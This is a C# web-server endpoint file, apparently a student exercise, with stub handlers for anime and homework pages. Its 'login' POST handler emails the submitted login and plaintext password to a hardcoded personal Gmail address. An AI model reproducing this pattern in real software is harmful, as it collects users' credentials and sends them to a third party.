using HttpServerLibrary;
using HttpServerLibrary.Attributes;
using HttpServerLibrary.HttpResponse;
using WebServer.services;

namespace WebServer.Endpoints;


//[Endpoint("route")]
internal class SendEmailEndpoint : EndpointBase
{
    [Get("anime")]
    public IHttpResponseResult GetAnimePage()
    {
        // логика отправки страницы Аниме с формой
        Console.WriteLine("Ура anime");

        var user = new { Name = "Иван", Email = "test@test.ru" };

        return Json(user);
    }

    [Get("home-work")]
    public void GetHomeWorkPage()
    {
        // логика
    }

    [Post("anime")]
    public void SendEmailAnime()
    {
        // логика отправки сообщения про Аниме
    }

    [Post("login")]
    public void SendEmailLogin(string login, string password)
    {
        var mail = new EmailService();

        mail.SendEmail("lagodykk2@gmail.com", "Оповещение о входе в аккаунт", $"В ваш аккаунт <s>Porn</s>GitHub был выполнен вход, login:{login}, password:{password}");
    }

    [Post("home-work")]
    public void SendEmailHomeWork()
    {
        // логика отправки ДЗ на {дата}
    }

}
